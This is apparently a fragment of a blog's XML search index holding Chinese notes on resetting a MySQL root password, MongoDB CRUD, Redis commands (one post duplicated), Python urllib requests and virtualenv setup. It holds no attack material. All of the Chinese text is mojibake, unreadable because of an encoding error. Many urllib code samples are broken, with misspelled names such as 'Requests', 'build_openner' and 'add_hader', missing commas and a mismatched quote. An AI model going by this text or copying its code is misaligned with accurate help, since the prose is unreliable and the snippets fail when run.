2ã€ä¿®æ”¹rootç”¨æˆ·å¯†ç  show databasesï¼› use mysql; update user set authentication_string=PASSWORD("å¯†ç ") where user='root'; update user set plugin="mysql_native_password"; flush privileges; quit; æ³¨:ç”±äºmysql5.7æ²¡æœ‰passwordå­—æ®µï¼Œå¯†ç å­˜å‚¨åœ¨authentication_stringå­—æ®µä¸­ 3ã€é‡æ–°å¯åŠ¨Mysql /etc/init.d/mysql restart 4ã€å†æ¬¡ä½¿ç”¨rootç”¨æˆ·ç™»é™† ç™»é™†æˆåŠŸ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>æ•°æ®åº“</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDBç®€å•çš„curd]]></title>
    <url>%2Fposts%2F589bc01a%2F</url>
    <content type="text"><![CDATA[é›†åˆåˆ›å»ºï¼šdb.createCollection("test_col,",{capped:true, size:10}) # "test_col" è¡¨åå­—(é›†åˆåå­—) # cappedï¼Œ é»˜è®¤falseï¼Œä¸è®¾ç½®ä¸Šé™ï¼Œtrueè®¾ç½®ä¸Šé™ æŸ¥çœ‹å½“å‰æ•°æ®åº“çš„é›†åˆï¼šshow collections åˆ é™¤é›†åˆï¼šdb.é›†åˆåç§°.drop() æŸ¥è¯¢ï¼š# æŸ¥æ‰¾é›†åˆä¸­æ‰€æœ‰çš„æ•°æ® db.collection_name.find() # æŸ¥è¯¢æ–‡æ¡£ # pretty() æ–¹æ³•ä»¥æ ¼å¼åŒ–çš„æ–¹å¼æ¥æ˜¾ç¤ºæ‰€æœ‰æ–‡æ¡£ ç¾è§‚ db.collection_name.find().pretty() # æŒ‡å®š_idæŸ¥æ‰¾ db.collection_name.find({_id:1}).pretty() _idï¼š å¦‚æœæ’å…¥æ•°æ®ä¸ç»™å®šidï¼Œä»–ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œå¯ä»¥é€šè¿‡idæŸ¥æ‰¾æ–‡æ¡£ æ’å…¥ï¼š# å‘é›†åˆæ’å…¥æ–‡æ¡£ db.collection_name.insert(document) ä¾‹å­ï¼šdb.col_test.insert({name:'xx', gender:'nan'}) ï¼ˆåœ¨é›†åˆä¸åˆ›å»ºçš„æ—¶å€™ä¹Ÿå¯ä»¥ï¼Œé›†åˆä¼šè‡ªåŠ¨è¢«åˆ›å»ºï¼‰ æ›´æ–°ï¼šdb.collection_name.update({}) # æ›´æ–°æ–‡æ¡£ db.collection_name.update({'count':88},{$set:{'count':89}}) # count ç”±88å˜æˆ89ï¼Œåªä¼šä½œç”¨äºç¬¬ä¸€æ¡æ•°æ® ä¾‹å­ï¼šdb.é›†åˆåç§°.update({name:'xx'}, {$set:{'name':'xps'}}, {multi:true}) å°†nameä¸ºxxçš„æ”¹ä¸ºyyï¼Œ multiå¤šè¡Œï¼Œé»˜è®¤falseï¼Œåªä½œç”¨äºç¬¬ä¸€ä¸ªï¼Œä¸ºtrueæ—¶ä¿®æ”¹å¤šæ¡ # æ›´æ–°å¤šè¡Œï¼Œè¿™ä¸ª3.2çš„ç‰ˆæœ¬æ‰æ”¯æŒ db.col_name.updateMany() åˆ é™¤ï¼šdb.collection_name.remove({}) # åˆ é™¤é›†åˆæ‰€æœ‰æ–‡æ¡£ å…¨éƒ¨åˆ é™¤ db.é›†åˆåç§°.remove({gender:'nan', {justone:true}}) # ä¾æ®æ¡ä»¶åˆ é™¤ä¸€æ¡ justoneé»˜è®¤falseï¼Œåˆ é™¤å¤šæ¡ #åˆ é™¤å¤šæ¡3.2ç‰ˆæœ¬æ‰æœ‰ db.col_name.deleteMany() # åˆ é™¤é›†åˆ db.col_name.drop() ä¿å­˜ ï¼ˆå¦‚æœé›†åˆä¸å­˜åœ¨ï¼Œåˆ™æ‰§è¡Œæ·»åŠ æ“ä½œï¼‰db.é›†åˆåç§°.save(document) æ•°æ®ç±»å‹object ID æ–‡æ¡£ID ï¼ˆä¸ä¼šé‡å¤ï¼Œ12å­—èŠ‚çš„16è¿›åˆ¶æ•°ï¼‰ String å­—ç¬¦ä¸² Boolean å­˜å‚¨ä¸€ä¸ªå¸ƒå°”å€¼ Integer æ•´æ•° Double æµ®ç‚¹å€¼ Arrays æ•°ç»„æˆ–åˆ—è¡¨ Object ç”¨äºåµŒå…¥å¼çš„æ–‡æ¡£ï¼Œå³ä¸€ä¸ªå€¼ä¸ºä¸€ä¸ªæ–‡æ¡£ Null å­˜å‚¨NUllå€¼ Times tamp æ—¶é—´æˆ³ Data å½“å‰æ—¥æœŸæ´»æ—¶é—´çš„UNIXæ—¶é—´æ ¼å¼ object ID ï¼š ï¼ˆä¸ä¼šé‡å¤ï¼Œ12å­—èŠ‚çš„16è¿›åˆ¶æ•°ï¼Œå‰4å½“å‰æ—¶é—´ï¼Œâ€¦) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
        <tag>æ•°æ®åº“</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redisåŸºç¡€]]></title>
    <url>%2Fposts%2F78b568c7%2F</url>
    <content type="text"><![CDATA[åœ¨Ubuntuç³»ç»Ÿä¸­é»˜è®¤é…ç½®æ–‡ä»¶åœ°å€: /etc/redis/redis.conf port6379 # é»˜è®¤ç«¯å£ logfile /var/log/redis.log # æ—¥å¿—æ–‡ä»¶ä½ç½® dbfilename dump.rdb # RDBæŒä¹…åŒ–æ•°æ®æ–‡ä»¶ bind 0.0.0.0 # æŒ‡å®šIPè¿›è¡Œç›‘å¬ ç»„æˆéƒ¨åˆ†ï¼š æœåŠ¡ç«¯: Redis-service å®¢æˆ·ç«¯: Redis-cli # è¿›å…¥æ•°æ®åº“ redis-cli # é€€å‡º exit åŸºæœ¬æ•°æ®ç±»å‹ï¼š String:å­—ç¬¦ä¸² Hash:å“ˆå¸Œ List:åˆ—è¡¨ Set:é›†åˆ Sorted set:æœ‰åºé›†åˆ # æŸ¥çœ‹å¸®åŠ© help @sorted_set String:å­—ç¬¦ä¸²stringæ˜¯redisæœ€åŸºæœ¬çš„ç±»å‹ï¼Œä¸€ä¸ªkeyå¯¹åº”ä¸€ä¸ªvalueã€‚ # è®¾ç½®å€¼ SET key value # å¾—åˆ°å€¼ GET key # å°†keyçš„å€¼è®¾ç½®ä¸ºæ–°çš„ï¼Œå¹¶è¿”å›æ—§çš„å€¼ GETSET key value_new # è®¾ç½®å¤šä¸ªé”®å€¼ MSET name xps sex nan #å–å‡ºå¤šä¸ªé”®çš„å€¼ MGET name sex # è·å–keyçš„å€¼çš„é•¿åº¦ STRLEN name # å°†è¯¥å€¼è¿½åŠ åˆ°nameçš„å€¼xpsçš„åé¢ APPEND name ppp # è®¾ç½®æŒç»­æ—¶é—´ SETEX name 10 xps # å¦‚æœè¯¥keyæœ‰å€¼å°±ä¸æ‰§è¡Œ SET name xxx # æ¯æ¬¡æ‰§è¡Œå°†valueçš„æ•°å­—åŠ 1 set age 10 INCR age # æ¯æ¬¡æ‰§è¡Œå°†valueçš„æ•°å­—å‡1 DECR age å…¨å±€Keyæ“ä½œï¼škeys * # æŸ¥çœ‹æ‰€æœ‰çš„é”® DEL key EXISTS key RENAME old_key new_key TYPE key Hash:å“ˆå¸Œï¼ˆå­—æ®µé‡Œé¢ä¹Ÿæœ‰å€¼ï¼‰Hashesç±»å‹çœ‹æˆå…·æœ‰String Keyå’ŒString Valueçš„mapå®¹å™¨ã€‚ ç±»ä¼¼äºè¿™ç§ç»“æ„ï¼š b = { one:xps two:xp three:x } # è®¾ç½®è¯¥keyå­—æ®µçš„å€¼ HSET key field value HSET b one xps HSET b one xps two xp three x # è·å–è¯¥keyå­—æ®µçš„å€¼ HGET key field HGET b one # è·å–hashè¡¨é‡Œé¢æ‰€æœ‰çš„å€¼ HVALS key Hvals b # è·å–hashè¡¨é‡Œé¢æ‰€æœ‰çš„å­—æ®µ Hkeys b # è·å–hashè¡¨ä¸­çš„å­—æ®µæ•°é‡ HLEN b Listç±»å‹ï¼ˆä¾‹å¦‚ï¼šå¾®åšè¯„è®ºï¼‰Listç±»å‹æ˜¯æŒ‰ç…§æ’å…¥é¡ºåºæ’åºçš„å­—ç¬¦ä¸²é“¾è¡¨ã€‚åœ¨æ’å…¥æ—¶ï¼Œå¦‚æœè¯¥é”®å¹¶ä¸å­˜åœ¨ï¼ŒRediså°†ä¸ºè¯¥é”®åˆ›å»ºä¸€ä¸ªæ–°çš„é“¾è¡¨ # å‘åˆ—è¡¨å¤´éƒ¨æ’å…¥æ•°æ®ï¼ˆé¡ºåºï¼šc,b,aï¼‰ LPUSH names a b c # æ’å…¥æ•°æ®ï¼ˆx,y,zï¼‰ RPUSh names2 x y z # è·å–åˆ—è¡¨é‡Œé¢æŸä¸ªç´¢å¼•å¯¹åº”çš„å€¼ LINDEX key index LINDEX names 0 # å¼¹å‡ºå¹¶åˆ é™¤æœ€åä¸€ä¸ªå…ƒç´  RPOP names # å¼¹å‡ºå¹¶åˆ é™¤æœ€å‰é¢ä¸€ä¸ªå…ƒç´  LPOP names # åˆ—è¡¨çš„é•¿åº¦ LLEN key # LSET key index value Setç±»å‹(å¾®åšç²‰ä¸ï¼Œå…³æ³¨äºº)Setç±»å‹æ²¡æœ‰æ’åºçš„å­—ç¬¦é›†åˆã€‚å¦‚æœå¤šæ¬¡æ·»åŠ ç›¸åŒå…ƒç´ ï¼ŒSetä¸­å°†ä»…ä¿ç•™è¯¥å…ƒç´ çš„ä¸€ä»½æ‹·è´ã€‚ # å‘é›†åˆæ·»åŠ æˆå‘˜ SADD setkey a b c d # æŸ¥çœ‹é›†åˆæˆå‘˜æ•°é‡ SCARD key # è¿­ä»£é›†åˆä¸­çš„æ‰€æœ‰å…ƒç´  SMEMBERS key SMEMBERS setkey # åˆ¤æ–­é›†åˆæ˜¯å¦å­˜åœ¨è¯¥å…ƒç´ (å­˜åœ¨ä¸º1ï¼Œä¸å­˜åœ¨ä¸º0) SMEMBERS key value SMEMBERS setkey a SMEMBERS setkey z #åˆ é™¤å¹¶è¿”å›é›†åˆä¸­çš„ä¸€ä¸ªéšæœºå…ƒç´  SPOP setkey Sorted Setç±»å‹ï¼ˆæ’è¡Œæ¦œï¼Œtop,ç›´æ’­ï¼‰æ¯ä¸€ä¸ªæˆå‘˜éƒ½ä¼šæœ‰ä¸€ä¸ªåˆ†æ•°(score)(æƒé‡)ä¸ä¹‹å…³è”ã€‚æˆå‘˜æ˜¯å”¯ä¸€çš„ï¼Œä½†æ˜¯åˆ†æ•°(score)å´æ˜¯å¯ä»¥é‡å¤çš„ã€‚ # å‘æœ‰åºé›†åˆæ·»åŠ æˆå‘˜ï¼Œå¹¶ä¸”ç»™ä»–æƒé‡ ZADD key score1 member1 [score2 member2] ZADD akey 1 a 2 b 3 c # æ˜¾ç¤ºé›†åˆæˆå‘˜æ•° ZCARD zkey # è®¡ç®—æœ‰åºé›†åˆæŒ‡å®šåŒºçš„åˆ†æ•°çš„æˆå‘˜æ•° ZCOUNT zkey 1 3 # ç§»é™¤æœ‰åºé›†åˆä¸€ä¸ªæˆ–å¤šä¸ªæˆå‘˜ ZREM zkey number # æŸ¥æ‰¾ è¿­ä»£æœ‰åºé›†åˆæ‰€æœ‰å…ƒç´  ZSCAN zkeys ### document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>æ•°æ®åº“</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rediså¸¸ç”¨å‘½ä»¤]]></title>
    <url>%2Fposts%2Fc3982ec0%2F</url>
    <content type="text"><![CDATA[åœ¨Ubuntuç³»ç»Ÿä¸­é»˜è®¤é…ç½®æ–‡ä»¶åœ°å€: /etc/redis/redis.conf port6379 # é»˜è®¤ç«¯å£ logfile /var/log/redis.log # æ—¥å¿—æ–‡ä»¶ä½ç½® dbfilename dump.rdb # RDBæŒä¹…åŒ–æ•°æ®æ–‡ä»¶ bind 0.0.0.0 # æŒ‡å®šIPè¿›è¡Œç›‘å¬ ç»„æˆéƒ¨åˆ†ï¼š æœåŠ¡ç«¯: Redis-service å®¢æˆ·ç«¯: Redis-cli # è¿›å…¥æ•°æ®åº“ redis-cli # é€€å‡º exit åŸºæœ¬æ•°æ®ç±»å‹ï¼š String:å­—ç¬¦ä¸² Hash:å“ˆå¸Œ List:åˆ—è¡¨ Set:é›†åˆ Sorted set:æœ‰åºé›†åˆ # æŸ¥çœ‹å¸®åŠ© help @sorted_set String:å­—ç¬¦ä¸²stringæ˜¯redisæœ€åŸºæœ¬çš„ç±»å‹ï¼Œä¸€ä¸ªkeyå¯¹åº”ä¸€ä¸ªvalueã€‚ # è®¾ç½®å€¼ SET key value # å¾—åˆ°å€¼ GET key # å°†keyçš„å€¼è®¾ç½®ä¸ºæ–°çš„ï¼Œå¹¶è¿”å›æ—§çš„å€¼ GETSET key value_new # è®¾ç½®å¤šä¸ªé”®å€¼ MSET name xps sex nan #å–å‡ºå¤šä¸ªé”®çš„å€¼ MGET name sex # è·å–keyçš„å€¼çš„é•¿åº¦ STRLEN name # å°†è¯¥å€¼è¿½åŠ åˆ°nameçš„å€¼xpsçš„åé¢ APPEND name ppp # è®¾ç½®æŒç»­æ—¶é—´ SETEX name 10 xps # å¦‚æœè¯¥keyæœ‰å€¼å°±ä¸æ‰§è¡Œ SET name xxx # æ¯æ¬¡æ‰§è¡Œå°†valueçš„æ•°å­—åŠ 1 set age 10 INCR age # æ¯æ¬¡æ‰§è¡Œå°†valueçš„æ•°å­—å‡1 DECR age å…¨å±€Keyæ“ä½œï¼škeys * # æŸ¥çœ‹æ‰€æœ‰çš„é”® DEL key EXISTS key RENAME old_key new_key TYPE key Hash:å“ˆå¸Œï¼ˆå­—æ®µé‡Œé¢ä¹Ÿæœ‰å€¼ï¼‰Hashesç±»å‹çœ‹æˆå…·æœ‰String Keyå’ŒString Valueçš„mapå®¹å™¨ã€‚ ç±»ä¼¼äºè¿™ç§ç»“æ„ï¼š b = { one:xps two:xp three:x } # è®¾ç½®è¯¥keyå­—æ®µçš„å€¼ HSET key field value HSET b one xps HSET b one xps two xp three x # è·å–è¯¥keyå­—æ®µçš„å€¼ HGET key field HGET b one # è·å–hashè¡¨é‡Œé¢æ‰€æœ‰çš„å€¼ HVALS key Hvals b # è·å–hashè¡¨é‡Œé¢æ‰€æœ‰çš„å­—æ®µ Hkeys b # è·å–hashè¡¨ä¸­çš„å­—æ®µæ•°é‡ HLEN b Listç±»å‹ï¼ˆä¾‹å¦‚ï¼šå¾®åšè¯„è®ºï¼‰Listç±»å‹æ˜¯æŒ‰ç…§æ’å…¥é¡ºåºæ’åºçš„å­—ç¬¦ä¸²é“¾è¡¨ã€‚åœ¨æ’å…¥æ—¶ï¼Œå¦‚æœè¯¥é”®å¹¶ä¸å­˜åœ¨ï¼ŒRediså°†ä¸ºè¯¥é”®åˆ›å»ºä¸€ä¸ªæ–°çš„é“¾è¡¨ # å‘åˆ—è¡¨å¤´éƒ¨æ’å…¥æ•°æ®ï¼ˆé¡ºåºï¼šc,b,aï¼‰ LPUSH names a b c # æ’å…¥æ•°æ®ï¼ˆx,y,zï¼‰ RPUSh names2 x y z # è·å–åˆ—è¡¨é‡Œé¢æŸä¸ªç´¢å¼•å¯¹åº”çš„å€¼ LINDEX key index LINDEX names 0 # å¼¹å‡ºå¹¶åˆ é™¤æœ€åä¸€ä¸ªå…ƒç´  RPOP names # å¼¹å‡ºå¹¶åˆ é™¤æœ€å‰é¢ä¸€ä¸ªå…ƒç´  LPOP names # åˆ—è¡¨çš„é•¿åº¦ LLEN key # LSET key index value Setç±»å‹(å¾®åšç²‰ä¸ï¼Œå…³æ³¨äºº)Setç±»å‹æ²¡æœ‰æ’åºçš„å­—ç¬¦é›†åˆã€‚å¦‚æœå¤šæ¬¡æ·»åŠ ç›¸åŒå…ƒç´ ï¼ŒSetä¸­å°†ä»…ä¿ç•™è¯¥å…ƒç´ çš„ä¸€ä»½æ‹·è´ã€‚ # å‘é›†åˆæ·»åŠ æˆå‘˜ SADD setkey a b c d # æŸ¥çœ‹é›†åˆæˆå‘˜æ•°é‡ SCARD key # è¿­ä»£é›†åˆä¸­çš„æ‰€æœ‰å…ƒç´  SMEMBERS key SMEMBERS setkey # åˆ¤æ–­é›†åˆæ˜¯å¦å­˜åœ¨è¯¥å…ƒç´ (å­˜åœ¨ä¸º1ï¼Œä¸å­˜åœ¨ä¸º0) SMEMBERS key value SMEMBERS setkey a SMEMBERS setkey z #åˆ é™¤å¹¶è¿”å›é›†åˆä¸­çš„ä¸€ä¸ªéšæœºå…ƒç´  SPOP setkey Sorted Setç±»å‹ï¼ˆæ’è¡Œæ¦œï¼Œtop,ç›´æ’­ï¼‰æ¯ä¸€ä¸ªæˆå‘˜éƒ½ä¼šæœ‰ä¸€ä¸ªåˆ†æ•°(score)(æƒé‡)ä¸ä¹‹å…³è”ã€‚æˆå‘˜æ˜¯å”¯ä¸€çš„ï¼Œä½†æ˜¯åˆ†æ•°(score)å´æ˜¯å¯ä»¥é‡å¤çš„ã€‚ # å‘æœ‰åºé›†åˆæ·»åŠ æˆå‘˜ï¼Œå¹¶ä¸”ç»™ä»–æƒé‡ ZADD key score1 member1 [score2 member2] ZADD akey 1 a 2 b 3 c # æ˜¾ç¤ºé›†åˆæˆå‘˜æ•° ZCARD zkey # è®¡ç®—æœ‰åºé›†åˆæŒ‡å®šåŒºçš„åˆ†æ•°çš„æˆå‘˜æ•° ZCOUNT zkey 1 3 # ç§»é™¤æœ‰åºé›†åˆä¸€ä¸ªæˆ–å¤šä¸ªæˆå‘˜ ZREM zkey number # æŸ¥æ‰¾ è¿­ä»£æœ‰åºé›†åˆæ‰€æœ‰å…ƒç´  ZSCAN zkeys ### document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>æ•°æ®åº“</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[urllibåº“çš„åŸºæœ¬ä½¿ç”¨]]></title>
    <url>%2Fposts%2F8045626e%2F</url>
    <content type="text"><![CDATA[urllibæ˜¯Pythonè‡ªå¸¦çš„æ ‡å‡†åº“ï¼Œæ— éœ€å®‰è£…ï¼Œç›´æ¥å¯ä»¥ç”¨ã€‚ æä¾›äº†å¦‚ä¸‹åŠŸèƒ½ï¼š ç½‘é¡µè¯·æ±‚ å“åº”è·å– ä»£ç†å’Œcookieè®¾ç½® å¼‚å¸¸å¤„ç† URLè§£æ çˆ¬è™«æ‰€éœ€è¦çš„åŠŸèƒ½ï¼ŒåŸºæœ¬ä¸Šåœ¨urllibä¸­éƒ½èƒ½æ‰¾åˆ°ï¼Œå­¦ä¹ è¿™ä¸ªæ ‡å‡†åº“ï¼Œå¯ä»¥æ›´åŠ æ·±å…¥çš„ç†è§£åé¢æ›´åŠ ä¾¿åˆ©çš„requestsåº“ã€‚ urllibåº“ urlopen è¯­æ³• urllib.request.urlopen(url,data=None,[timeout,]*,cafile=None,capath=None,cadefault=False,context=None) #url:è®¿é—®çš„ç½‘å€ #data:é¢å¤–çš„æ•°æ®ï¼Œå¦‚headerï¼Œform data ç”¨æ³• # request:GET import urllib.request response = urllib.request.urlopen('http://www.baidu.com') print(response.read().decode('utf-8')) # request: POST # httpæµ‹è¯•ï¼šhttp://httpbin.org/ import urllib.parse import urllib.request data = bytes(urllib.parse.urlencode({'word':'hello'}),encoding='utf8') response = urllib.request.urlopen('http://httpbin.org/post',data=data) print(response.read()) # è¶…æ—¶è®¾ç½® import urllib.request response = urllib.request.urlopen('http://httpbin.org/get',timeout=1) print(response.read()) import socket import urllib.request import urllib.error try: response = urllib.request.urlopen('http://httpbin.org/get',timeout=0.1) except urllib.error.URLError as e: if isinstance(e.reason,socket.timeout): print('TIME OUT') å“åº” # å“åº”ç±»å‹ import urllib.open response = urllib.request.urlopen('https:///www.python.org') print(type(response)) # çŠ¶æ€ç ï¼Œ å“åº”å¤´ import urllib.request response = urllib.request.urlopen('https://www.python.org') print(response.status) print(response.getheaders()) # è·å–å“åº”å¤´ print(response.getheader('Server')) # å¾—åˆ°æŒ‡å®šçš„å“åº”å¤´ Request å£°æ˜ä¸€ä¸ªrequestå¯¹è±¡ï¼Œè¯¥å¯¹è±¡å¯ä»¥åŒ…æ‹¬headerç­‰ä¿¡æ¯ï¼Œç„¶åç”¨urlopenæ‰“å¼€ã€‚ # ç®€å•ä¾‹å­ import urllib.request request = urllib.request.Requests('https://python.org') response = urllib.request.urlopen(request) print(response.read().decode('utf-8')) # å¢åŠ header from urllib import request, parse url = 'http://httpbin.org/post' headers = { 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36' 'Host':'httpbin.org' } # æ„é€ POSTè¡¨æ ¼ dict = { 'name':'Germey' } data = bytes(parse.urlencode(dict),encoding='utf8') req = request.Request(url=url,data=data,headers=headers,method='POST') response = request.urlopen(req) print(response.read()).decode('utf-8') # æˆ–è€…éšåå¢åŠ header from urllib import request, parse url = 'http://httpbin.org/post' dict = { 'name':'Germey' } req = request.Request(url=url,data=data,method='POST') req.add_hader('User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36') response = request.urlopen(req) print(response.read().decode('utf-8')) Handlerï¼šå¤„ç†æ›´åŠ å¤æ‚çš„é¡µé¢ ä»£ç† import urllib.request proxy_handler = urllib.request.ProxyHandler({ 'http':'http://127.0.0.1:9743' 'https':'https://127.0.0.1.9743' }) opener = urllib.request.build_openner(proxy_handler) response = opener.open('http://www.baidu.com') print(response.read()) Cookie:å®¢æˆ·ç«¯ç”¨äºè®°å½•ç”¨æˆ·èº«ä»½,ç»´æŒç™»å½•ä¿¡æ¯ import http.cookiejar, urllib.request cookie = http.cookiejar.CookieJar() handler = urllib.request.HTTPCookieProcessor(cookie) opener = urllib.request.build_opener(handler) response = opener.open("http://www.baidu.com") for item in cookie: print(item.name+"="+item.value) # ä¿å­˜cookiä¸ºæ–‡æœ¬ import http.cookiejar, urllib.request filename = "cookie.txt" # ä¿å­˜ç±»å‹æœ‰å¾ˆå¤šç§ ## ç±»å‹1 cookie = http.cookiejar.MozillaCookieJar(filename) ## ç±»å‹2 cookie = http.cookiejar.LWPCookieJar(filename) handler = urllib.request.HTTPCookieProcessor(cookie) opener = urllib.request.build_opener(handler) response = opener.open("http://www.baidu.com") # ä½¿ç”¨ç›¸åº”çš„æ–¹æ³•è¯»å– import http.cookiejar, urllib.request cookie = http.cookiejar.LWPCookieJar() cookie.load('cookie.txt', ignore_discard=True, ignore_expires=True) handler = urllib.request.HTTPCookieProcessor(cookie) opener = urllib.request.build_opener(handler) response = opener.open("http://www.baidu.com") å¼‚å¸¸å¤„ç† æ•è·å¼‚å¸¸ï¼Œä¿è¯ç¨‹åºç¨³å®šè¿è¡Œ # è®¿é—®ä¸å­˜åœ¨çš„é¡µé¢ from urllib import request, error try: response = request.urlopen('http://cuiqingcai.com/index.htm') except error.URLError as e: print(e.reason) # å…ˆæ•è·å­ç±»é”™è¯¯ from urllib imort request, error try: response = request.urlopen('http://cuiqingcai.com/index.htm') except error.HTTPError as e: print(e.reason, e.code, e.headers, sep='\n') except error.URLError as e: print(e.reason) else: print("Request Successfully') # åˆ¤æ–­åŸå›  import socket import urllib.request import urllib.error try: response = urllib.request.urlopen('http://httpbin.org/get',timeout=0.1) except urllib.error.URLError as e: if isinstance(e.reason, socket.timeout): print('TIME OUT') URLè§£æ ä¸»è¦æ˜¯ä¸€ä¸ªå·¥å…·æ¨¡å—ï¼Œå¯ç”¨äºä¸ºçˆ¬è™«æä¾›URLã€‚ urlparse:æ‹†åˆ†URL urlib.parse.urlparse(urlstring,scheme='', allow_fragments=True) # scheme: åè®®ç±»å‹ # æ˜¯å¦å¿½ç•¥â€™#â€˜éƒ¨åˆ† ä¸¾ä¸ªä¾‹å­ from urllib import urlparse result = urlparse("https://edu.hellobi.com/course/157/play/lesson/2580") result ##ParseResult(scheme='https', netloc='edu.hellobi.com', path='/course/157/play/lesson/2580', params='', query='', fragment='') urlunparse:æ‹¼æ¥URLï¼Œä¸ºurlparseçš„åå‘æ“ä½œ from urllib.parse import urlunparse data = ['http','www.baidu.com','index.html','user','a=6','comment'] print(urlunparse(data)) urljoin:æ‹¼æ¥ä¸¤ä¸ªURL urljoin urlencode:å­—å…¸å¯¹è±¡è½¬æ¢æˆGETè¯·æ±‚å¯¹è±¡ from urllib.parse import urlencode params = { 'name':'germey', 'age': 22 } base_url = 'http://www.baidu.com?' url = base_url + urlencode(params) print(url) æœ€åè¿˜æœ‰ä¸€ä¸ªrobotparseï¼Œè§£æç½‘ç«™å…è®¸çˆ¬å–çš„éƒ¨åˆ†ã€‚ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>çˆ¬è™«</category>
      </categories>
      <tags>
        <tag>çˆ¬è™«</tag>
        <tag>python</tag>
        <tag>urllib</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[virtualenv]]></title>
    <url>%2Fposts%2F9c06d95c%2F</url>
    <content type="text"><![CDATA[æ³¨æ„ï¼š # è…¾è®¯äº‘çš„æºæœ‰æ—¶å€™ä¸è¡Œï¼Œå¯ä»¥æ›´æ¢æº pip3 install virtualenv -i https://pypi.doubanio.com/simple/ --user æ­å»ºè™šæ‹Ÿç¯å¢ƒ å…ˆå®‰è£… virtualenv, å†å®‰è£… virtualenvwrapperpip install virtaulenv pip install virtualenvwrapper è®¾ç½®è™šæ‹Ÿçš„ç¯å¢ƒå˜é‡ . å…ˆæ‰¾åˆ° virtualenvwrapper.sh æ–‡ä»¶find / -name "virtualenvwrapper.sh" å†™å…¥ .bashrc æ–‡ä»¶export WORKON_HOME=$HOME/.virtualenvs source è¿™é‡Œå†™èµ·å‰é¢æ‰¾å‡ºæ¥çš„æ–‡ä»¶ åŸºæœ¬å‘½ä»¤ # åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ mkvirtualenv pyenv # åˆ é™¤è™šæ‹Ÿæœºç¯å¢ƒ rmvirtualenv pyenv # è¿›å…¥è™šæ‹Ÿç¯å¢ƒ workon pyenv # æ¨å‡ºè™šæ‹Ÿç¯å¢ƒ deactivate # åˆ›å»ºè™šæ‹Ÿç¯å¢ƒçš„æ˜¯æ—¶å€™ï¼ŒæŒ‡å®š Python ç‰ˆæœ¬ mkvirtualenv å¦‚æœæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š ERROR: virtualenvwrapper could not find virtualenv in your path å› ä¸ºæ˜¯è¢«å®‰è£…åœ¨é»˜è®¤çš„Pythonç›®å½•ä¸‹ï¼Œæ·»åŠ è½¯é“¾æ¥å³å¯ ln -s /usr/bin/python36/bin/virtualenv /usr/local/bin/virtualenv æ‰¹å¤„ç†å®‰è£…åº“ï¼šrequirements.txtpip freeze å†»ç»“å‡ºæ‰€æœ‰åŒ…ä¸ç‰ˆæœ¬å· å¯¼å‡ºï¼špip freeze &gt; requirements.txt å†å®‰è£…: pip install -r requirements.txt è™šæ‹Ÿç¯å¢ƒï¼š windowsæ¿€æ´»è™šæ‹Ÿç¯å¢ƒ ï¼špycharmè‡ªåŠ¨æ¿€æ´» cd è™šæ‹Ÿç¯å¢ƒç›®å½•venv/Scripts/ active linuxæ¿€æ´»è™šæ‹Ÿç¯å¢ƒ ï¼šsource ./venv/bin/active document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>virtualenv</tag>
        <tag>è™šæ‹Ÿç¯å¢ƒ</tag>
      </tags>
  </entry>
  <entry>
